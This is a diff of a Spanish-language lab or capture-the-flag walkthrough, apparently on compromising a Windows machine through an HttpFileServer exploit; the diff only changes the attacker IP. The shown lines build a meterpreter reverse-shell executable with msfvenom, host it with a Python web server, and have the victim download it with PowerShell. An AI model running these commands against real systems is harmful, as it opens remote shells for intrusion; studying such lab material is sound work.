@@ -89,7 +89,7 @@ Lo que debemos de hacer en casos como este es recurrir a su predecesor <a href="
 
 En mi caso me econtre un error ya que la shell que nos ha propocionado el exploit de HttpFileServer no es lo suficientemente estable. Como bypass de este problema podemos generar una shell meterpreter desde nuestra máquina atacante.
 ```
-msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o met.exe
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=10.10.14.10 LPORT=443 -f exe -o met.exe
 ```
 
 Para compartir la shell podemos ejecutar un servidor http con python
@@ -99,7 +99,7 @@ python3 -m http.server 80
 
 Aprovechando la shell PS que ya tenemos descargamos sherlock del siguiente modo
 ```
-iwr -uri http://10.10.14.5/met.exe -outfile met.exe
+iwr -uri http://10.10.14.10/met.exe -outfile met.exe
 ```
 
 Por parte de nuestra maquina atacante a la escucha deberemos de utilizar el multi/handler de msfconsole y definir los siguientes parámetros.
